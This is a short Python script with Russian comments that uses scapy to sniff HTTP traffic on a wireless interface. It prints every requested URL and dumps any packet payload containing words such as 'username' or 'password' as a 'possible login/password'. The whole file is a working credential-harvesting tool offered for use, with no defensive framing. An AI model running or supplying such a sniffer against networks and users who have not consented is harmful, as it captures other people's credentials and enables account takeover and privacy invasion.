import scapy.all as scapy
from scapy.layers import http

#pip install scapy_http

def getURL(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #Совмещаем первую и вторую часть url
def get_login_info(packet):
    if packet.haslayer(scapy.Raw): 
        load = packet[scapy.Raw].load #С помощью этого выражения можно получить доступ к содержимому пакета на уровне Raw
        keywords = ['username', 'user', 'login', 'password', 'pass'] #Возможные варианты надписи логина на сайтах для перебора
        for keyword in keywords:
            if keyword in load:
                return load
def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet) #Запрос на просмотр пакетов
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #Отбираем пакеты с http
        url = getURL(packet)
        print('URL адрес ---> ' + str(url)) #Просматриваем url адреса
        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+]Возможный логин/пароль ----> ', login_info, '\n\n')

sniff('wlan0')
